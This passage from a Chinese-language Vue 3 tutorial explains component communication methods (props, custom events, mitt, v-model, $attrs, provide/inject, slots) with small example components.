class="line">&lt;Child :car=&quot;car&quot; :getToy=&quot;getToy&quot;/&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot; name=&quot;Father&quot;&gt;</span><br><span class="line">import Child from &#x27;./Child.vue&#x27;</span><br><span class="line">import &#123; ref &#125; from &quot;vue&quot;;</span><br><span class="line">// 数据</span><br><span class="line">const car = ref(&#x27;奔驰&#x27;)</span><br><span class="line">const toy = ref()</span><br><span class="line">// 方法</span><br><span class="line">function getToy(value:string)&#123;</span><br><span class="line">toy.value = value</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>子组件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;child&quot;&gt;</span><br><span class="line">    &lt;h3&gt;子组件&lt;/h3&gt;</span><br><span class="line">&lt;h4&gt;我的玩具：&#123;&#123; toy &#125;&#125;&lt;/h4&gt;</span><br><span class="line">&lt;h4&gt;父给我的车：&#123;&#123; car &#125;&#125;&lt;/h4&gt;</span><br><span class="line">&lt;button @click=&quot;getToy(toy)&quot;&gt;玩具给父亲&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot; name=&quot;Child&quot;&gt;</span><br><span class="line">import &#123; ref &#125; from &quot;vue&quot;;</span><br><span class="line">const toy = ref(&#x27;奥特曼&#x27;)</span><br><span class="line"></span><br><span class="line">defineProps([&#x27;car&#x27;,&#x27;getToy&#x27;])</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="6-2-【自定义事件】">6.2. 【自定义事件】</h2><ol><li>概述：自定义事件常用于：<strong>子 =&gt; 父。</strong></li><li>注意区分好：原生事件、自定义事件。</li></ol><ul><li>原生事件：<ul><li>事件名是特定的（<code>click</code>、<code>mosueenter</code>等等）</li><li>事件对象<code>$event</code>: 是包含事件相关信息的对象（<code>pageX</code>、<code>pageY</code>、<code>target</code>、<code>keyCode</code>）</li></ul></li><li>自定义事件：<ul><li>事件名是任意名称</li><li><strong style="color:red">事件对象<code>$event</code>: 是调用<code>emit</code>时所提供的数据，可以是任意类型！！！</strong ></li></ul></li></ul><ol start="3"><li><p>示例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--在父组件中，给子组件绑定自定义事件：--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Child</span> @<span class="attr">send-toy</span>=<span class="string">&quot;toy = $event&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--注意区分原生事件与自定义事件中的$event--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;toy = $event&quot;</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//子组件中，触发事件：</span></span><br><span class="line"><span class="variable language_">this</span>.$emit(<span class="string">&#x27;send-toy&#x27;</span>, 具体数据)</span><br></pre></td></tr></table></figure></li></ol><h2 id="6-3-【mitt】">6.3. 【mitt】</h2><p>概述：与消息订阅与发布（<code>pubsub</code>）功能类似，可以实现任意组件间通信。</p><p>安装<code>mitt</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i mitt</span><br></pre></td></tr></table></figure><p>新建文件：<code>src\utils\emitter.ts</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 引入mitt </span></span><br><span class="line"><span class="keyword">import</span> mitt <span class="keyword">from</span> <span class="string">&quot;mitt&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建emitter</span></span><br><span class="line"><span class="keyword">const</span> emitter = <span class="title function_">mitt</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  // 绑定事件</span></span><br><span class="line"><span class="comment">  emitter.on(&#x27;abc&#x27;,(value)=&gt;&#123;</span></span><br><span class="line"><span class="comment">    console.log(&#x27;abc事件被触发&#x27;,value)</span></span><br><span class="line"><span class="comment">  &#125;)</span></span><br><span class="line"><span class="comment">  emitter.on(&#x27;xyz&#x27;,(value)=&gt;&#123;</span></span><br><span class="line"><span class="comment">    console.log(&#x27;xyz事件被触发&#x27;,value)</span></span><br><span class="line"><span class="comment">  &#125;)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  setInterval(() =&gt; &#123;</span></span><br><span class="line"><span class="comment">    // 触发事件</span></span><br><span class="line"><span class="comment">    emitter.emit(&#x27;abc&#x27;,666)</span></span><br><span class="line"><span class="comment">    emitter.emit(&#x27;xyz&#x27;,777)</span></span><br><span class="line"><span class="comment">  &#125;, 1000);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  setTimeout(() =&gt; &#123;</span></span><br><span class="line"><span class="comment">    // 清理事件</span></span><br><span class="line"><span class="comment">    emitter.all.clear()</span></span><br><span class="line"><span class="comment">  &#125;, 3000); </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建并暴露mitt</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> emitter</span><br></pre></td></tr></table></figure><p>接收数据的组件中：绑定事件、同时在销毁前解绑事件：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> emitter <span class="keyword">from</span> <span class="string">&quot;@/utils/emitter&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; onUnmounted &#125; <span class="keyword">from</span> <span class="string">&quot;vue&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 绑定事件</span></span><br><span class="line">emitter.<span class="title function_">on</span>(<span class="string">&#x27;send-toy&#x27;</span>,<span class="function">(<span class="params">value</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;send-toy事件被触发&#x27;</span>,value)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="title function_">onUnmounted</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">  <span class="comment">// 解绑事件</span></span><br><span class="line">  emitter.<span class="title function_">off</span>(<span class="string">&#x27;send-toy&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>【第三步】：提供数据的组件，在合适的时候触发事件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> emitter <span class="keyword">from</span> <span class="string">&quot;@/utils/emitter&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sendToy</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="comment">// 触发事件</span></span><br><span class="line">  emitter.<span class="title function_">emit</span>(<span class="string">&#x27;send-toy&#x27;</span>,toy.<span class="property">value</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意这个重要的内置关系，总线依赖着这个内置关系</strong></p><h2 id="6-4-【v-model】">6.4.【v-model】</h2><ol><li><p>概述：实现 <strong>父↔子</strong> 之间相互通信。</p></li><li><p>前序知识 —— <code>v-model</code>的本质</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 使用v-model指令 --&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; v-model=&quot;userName&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- v-model的本质是下面这行代码 --&gt;</span><br><span class="line">&lt;input </span><br><span class="line">  type=&quot;text&quot; </span><br><span class="line">  :value=&quot;userName&quot; </span><br><span class="line">  @input=&quot;userName =(&lt;HTMLInputElement&gt;$event.target).value&quot;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></li><li><p>组件标签上的<code>v-model</code>的本质：<code>:moldeValue</code> ＋ <code>update:modelValue</code>事件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 组件标签上使用v-model指令 --&gt;</span><br><span class="line">&lt;AtguiguInput v-model=&quot;userName&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 组件标签上v-model的本质 --&gt;</span><br><span class="line">&lt;AtguiguInput :modelValue=&quot;userName&quot; @update:model-value=&quot;userName = $event&quot;/&gt;</span><br></pre></td></tr></table></figure><p><code>AtguiguInput</code>组件中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;box&quot;&gt;</span><br><span class="line">    &lt;!--将接收的value值赋给input元素的value属性，目的是：为了呈现数据 --&gt;</span><br><span class="line">&lt;!--给input元素绑定原生input事件，触发input事件时，进而触发update:model-value事件--&gt;</span><br><span class="line">    &lt;input </span><br><span class="line">       type=&quot;text&quot; </span><br><span class="line">       :value=&quot;modelValue&quot; </span><br><span class="line">       @input=&quot;emit(&#x27;update:model-value&#x27;,$event.target.value)&quot;</span><br><span class="line">    &gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot; name=&quot;AtguiguInput&quot;&gt;</span><br><span class="line">  // 接收props</span><br><span class="line">  defineProps([&#x27;modelValue&#x27;])</span><br><span class="line">  // 声明事件</span><br><span class="line">  const emit = defineEmits([&#x27;update:model-value&#x27;])</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li><li><p>也可以更换<code>value</code>，例如改成<code>abc</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 也可以更换value，例如改成abc--&gt;</span><br><span class="line">&lt;AtguiguInput v-model:abc=&quot;userName&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 上面代码的本质如下 --&gt;</span><br><span class="line">&lt;AtguiguInput :abc=&quot;userName&quot; @update:abc=&quot;userName = $event&quot;/&gt;</span><br></pre></td></tr></table></figure><p><code>AtguiguInput</code>组件中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;box&quot;&gt;</span><br><span class="line">    &lt;input </span><br><span class="line">       type=&quot;text&quot; </span><br><span class="line">       :value=&quot;abc&quot; </span><br><span class="line">       @input=&quot;emit(&#x27;update:abc&#x27;,$event.target.value)&quot;</span><br><span class="line">    &gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot; name=&quot;AtguiguInput&quot;&gt;</span><br><span class="line">  // 接收props</span><br><span class="line">  defineProps([&#x27;abc&#x27;])</span><br><span class="line">  // 声明事件</span><br><span class="line">  const emit = defineEmits([&#x27;update:abc&#x27;])</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li><li><p>如果<code>value</code>可以更换，那么就可以在组件标签上多次使用<code>v-model</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;AtguiguInput v-model:abc=&quot;userName&quot; v-model:xyz=&quot;password&quot;/&gt;</span><br></pre></td></tr></table></figure></li></ol><h2 id="6-5-【-attrs-】">6.5.【$attrs 】</h2><ol><li><p>概述：<code>$attrs</code>用于实现<strong>当前组件的父组件</strong>，向<strong>当前组件的子组件</strong>通信（<strong>祖→孙</strong>）。</p></li><li><p>具体说明：<code>$attrs</code>是一个对象，包含所有父组件传入的标签属性。</p><blockquote><p>注意：<code>$attrs</code>会自动排除<code>props</code>中声明的属性(可以认为声明过的 <code>props</code> 被子组件自己“消费”了)</p></blockquote></li></ol><p>父组件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;father&quot;&gt;</span><br><span class="line">    &lt;h3&gt;父组件&lt;/h3&gt;</span><br><span class="line">&lt;Child :a=&quot;a&quot; :b=&quot;b&quot; :c=&quot;c&quot; :d=&quot;d&quot; v-bind=&quot;&#123;x:100,y:200&#125;&quot; :updateA=&quot;updateA&quot;/&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot; name=&quot;Father&quot;&gt;</span><br><span class="line">import Child from &#x27;./Child.vue&#x27;</span><br><span class="line">import &#123; ref &#125; from &quot;vue&quot;;</span><br><span class="line">let a = ref(1)</span><br><span class="line">let b = ref(2)</span><br><span class="line">let c = ref(3)</span><br><span class="line">let d = ref(4)</span><br><span class="line"></span><br><span class="line">function updateA(value)&#123;</span><br><span class="line">a.value = value</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>子组件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div class=&quot;child&quot;&gt;</span><br><span class="line">&lt;h3&gt;子组件&lt;/h3&gt;</span><br><span class="line">&lt;GrandChild v-bind=&quot;$attrs&quot;/&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot; name=&quot;Child&quot;&gt;</span><br><span class="line">import GrandChild from &#x27;./GrandChild.vue&#x27;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>孙组件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div class=&quot;grand-child&quot;&gt;</span><br><span class="line">&lt;h3&gt;孙组件&lt;/h3&gt;</span><br><span class="line">&lt;h4&gt;a：&#123;&#123; a &#125;&#125;&lt;/h4&gt;</span><br><span class="line">&lt;h4&gt;b：&#123;&#123; b &#125;&#125;&lt;/h4&gt;</span><br><span class="line">&lt;h4&gt;c：&#123;&#123; c &#125;&#125;&lt;/h4&gt;</span><br><span class="line">&lt;h4&gt;d：&#123;&#123; d &#125;&#125;&lt;/h4&gt;</span><br><span class="line">&lt;h4&gt;x：&#123;&#123; x &#125;&#125;&lt;/h4&gt;</span><br><span class="line">&lt;h4&gt;y：&#123;&#123; y &#125;&#125;&lt;/h4&gt;</span><br><span class="line">&lt;button @click=&quot;updateA(666)&quot;&gt;点我更新A&lt;/button&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot; name=&quot;GrandChild&quot;&gt;</span><br><span class="line">defineProps([&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;d&#x27;,&#x27;x&#x27;,&#x27;y&#x27;,&#x27;updateA&#x27;])</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="6-6-【-refs、-parent】">6.6. 【$refs、$parent】</h2><ol><li><p>概述：</p><ul><li><code>$refs</code>用于 ：<strong>父→子。</strong></li><li><code>$parent</code>用于：<strong>子→父。</strong></li></ul></li><li><p>原理如下：</p><table><thead><tr><th>属性</th><th>说明</th></tr></thead><tbody><tr><td><code>$refs</code></td><td>值为对象，包含所有被<code>ref</code>属性标识的<code>DOM</code>元素或组件实例。</td></tr><tr><td><code>$parent</code></td><td>值为对象，当前组件的父组件实例对象。</td></tr></tbody></table></li></ol><h2 id="6-7-【provide、inject】">6.7. 【provide、inject】</h2><ol><li><p>概述：实现<strong>祖孙组件</strong>直接通信</p></li><li><p>具体使用：</p><ul><li>在祖先组件中通过<code>provide</code>配置向后代组件提供数据</li><li>在后代组件中通过<code>inject</code>配置来声明接收数据</li></ul></li><li><p>具体编码：</p><p>【第一步】父组件中，使用<code>provide</code>提供数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;father&quot;&gt;</span><br><span class="line">    &lt;h3&gt;父组件&lt;/h3&gt;</span><br><span class="line">    &lt;h4&gt;资产：&#123;&#123; money &#125;&#125;&lt;/h4&gt;</span><br><span class="line">    &lt;h4&gt;汽车：&#123;&#123; car &#125;&#125;&lt;/h4&gt;</span><br><span class="line">    &lt;button @click=&quot;money += 1&quot;&gt;资产+1&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;car.price += 1&quot;&gt;汽车价格+1&lt;/button&gt;</span><br><span class="line">    &lt;Child/&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot; name=&quot;Father&quot;&gt;</span><br><span class="line">  import Child from &#x27;./Child.vue&#x27;</span><br><span class="line">  import &#123; ref,reactive,provide &#125; from &quot;vue&quot;;</span><br><span class="line">  // 数据</span><br><span class="line">  let money = ref(100)</span><br><span class="line">  let car = reactive(&#123;</span><br><span class="line">    brand:&#x27;奔驰&#x27;,</span><br><span class="line">    price:100</span><br><span class="line">  &#125;)</span><br><span class="line">  // 用于更新money的方法</span><br><span class="line">  function updateMoney(value:number)&#123;</span><br><span class="line">    money.value += value</span><br><span class="line">  &#125;</span><br><span class="line">  // 提供数据</span><br><span class="line">  provide(&#x27;moneyContext&#x27;,&#123;money,updateMoney&#125;)</span><br><span class="line">  provide(&#x27;car&#x27;,car)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><blockquote><p>注意：子组件中不用编写任何东西，是不受到任何打扰的</p></blockquote><p>【第二步】孙组件中使用<code>inject</code>配置项接受数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">   &lt;template&gt;</span><br><span class="line">     &lt;div class=&quot;grand-child&quot;&gt;</span><br><span class="line">       &lt;h3&gt;我是孙组件&lt;/h3&gt;</span><br><span class="line">       &lt;h4&gt;资产：&#123;&#123; money &#125;&#125;&lt;/h4&gt;</span><br><span class="line">       &lt;h4&gt;汽车：&#123;&#123; car &#125;&#125;&lt;/h4&gt;</span><br><span class="line">       &lt;button @click=&quot;updateMoney(6)&quot;&gt;点我&lt;/button&gt;</span><br><span class="line">     &lt;/div&gt;</span><br><span class="line">   &lt;/template&gt;</span><br><span class="line">   </span><br><span class="line">   &lt;script setup lang=&quot;ts&quot; name=&quot;GrandChild&quot;&gt;</span><br><span class="line">     import &#123; inject &#125; from &#x27;vue&#x27;;</span><br><span class="line">     // 注入数据</span><br><span class="line">    let &#123;money,updateMoney&#125; = inject(&#x27;moneyContext&#x27;,&#123;money:0,updateMoney:(x:number)=&gt;&#123;&#125;&#125;)</span><br><span class="line">     let car = inject(&#x27;car&#x27;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li></ol><h2 id="6-8-【pinia】">6.8. 【pinia】</h2><p>参考之前<code>pinia</code>部分的讲解</p><h2 id="6-9-【slot】">6.9. 【slot】</h2><h3 id="1-默认插槽">1. 默认插槽</h3><p><img src="http://49.232.112.44/images/default_slot.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">父组件中：</span><br><span class="line">        &lt;Category title=&quot;今日热门游戏&quot;&gt;</span><br><span class="line">          &lt;ul&gt;</span><br><span class="line">            &lt;li v-for=&quot;g in games&quot; :key=&quot;g.id&quot;&gt;&#123;&#123; g.name &#125;&#125;&lt;/li&gt;</span><br><span class="line">          &lt;/ul&gt;</span><br><span class="line">        &lt;/Category&gt;</span><br><span class="line">子组件中：</span><br><span class="line">        &lt;template&gt;</span><br><span class="line">          &lt;div class=&quot;item&quot;&gt;</span><br><span class="line">            &lt;h3&gt;&#123;&#123; title &#125;&#125;&lt;/h3&gt;</span><br><span class="line">            &lt;!-- 默认插槽 --&gt;</span><br><span class="line">            &lt;slot&gt;&lt;/slot&gt;</span><br><span class="line">          &lt;/div&gt;</span><br><span class="line">        &lt;/template&gt;</span><br></pre></td></tr></table></figure><h3 id="2-具名插槽">2. 具名插槽</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">父组件中：</span><br><span class="line">        &lt;Category title=&quot;今日热门游戏&quot;&gt;</span><br><span class="line">          &lt;template v-slot:s1&gt;</span><br><span class="line">            &lt;ul&gt;</span><br><span class="line">              &lt;li v-for=&quot;g in games&quot; :key=&quot;g.id&quot;&gt;&#123;&#123; g.name &#125;&#125;&lt;/li&gt;</span><br><span class="line">            &lt;/ul&gt;</span><br><span class="line">          &lt;/template&gt;</span><br><span class="line">          &lt;template #s2&gt;</span><br><span class="line">            &lt;a href=&quot;&quot;&gt;更多&lt;/a&gt;</span><br><span class="line">          &lt;/template&gt;</span><br><span class="line">        &lt;/Category&gt;</span><br><span class="line">子组件中：</span><br><span class="line">        &lt;template&gt;</span><br><span class="line">          &lt;div class=&quot;item&quot;&gt;</span><br><span class="line">            &lt;h3&gt;&#123;&#123; title &#125;&#125;&lt;/h3&gt;</span><br><span class="line">            &lt;slot name=&quot;s1&quot;&gt;&lt;/slot&gt;</span><br><span class="line">            &lt;slot name=&quot;s2&quot;&gt;&lt;/slot&gt;</span><br><span class="line">          &lt;/div&gt;</span><br><span class="line">        &lt;/template&gt;</span><br></pre></td></tr></table></figure><h3 id="3-作用域插槽">3. 作用域插槽</h3><ol><li><p>理解：<span style="color:red">数据在组件的自身，但根据数据生成的结构需要组件的使用者来决定。</span>（新闻数据在<code>News</code>组件中，但使用数据所遍历出来的结构由<code>App</code>组件决定）</p></li><li><p>具体编码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">父组件中：</span><br><span class="line">      &lt;Game v-slot=&quot;params&quot;&gt;</span><br><span class="line">      &lt;!-- &lt;Game v-slot:default=&quot;params&quot;&gt; --&gt;</span><br><span class="line">      &lt;!-- &lt;Game #default=&quot;params&quot;&gt; --&gt;</span><br><span class="line">        &lt;ul&gt;</span><br><span class="line">          &lt;li v-for=&quot;g in params.games&quot; :key=&quot;g.id&quot;&gt;&#123;&#123; g.name &#125;&#125;&lt;/li&gt;</span><br><span class="line">        &lt;/ul&gt;</span><br><span class="line">      &lt;/Game&gt;</span><br><span class="line"></span><br><span class="line">子组件中：</span><br><span class="line">      &lt;template&gt;</span><br><span class="line">        &lt;div class=&quot;category&quot;&gt;</span><br><span class="line">          &lt;h2&gt;今日游戏榜单&lt;/h2&gt;</span><br><span class="line">          &lt;slot :games=&quot;games&quot; a=&quot;哈哈&quot;&gt;&lt;/slot&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/template&gt;</span><br><span class="line"></span><br><span class="line">      &lt;script setup lang=&quot;ts&quot; name=&quot;Category&quot;&gt;</span><br><span class="line">        import &#123;reactive&#125; from &#x27;vue&#x27;</span><br><span class="line">        let games = reactive([</span><br><span class="line">          &#123;id:&#x27;asgdytsa01&#x27;,name:&#x27;英雄联盟&#x27;&#125;,</span><br><span class="line">          &#123;id:&#x27;asgdytsa02&#x27;,name:&#x27;王者荣耀&#x27;&#125;,</span><br><span class="line">          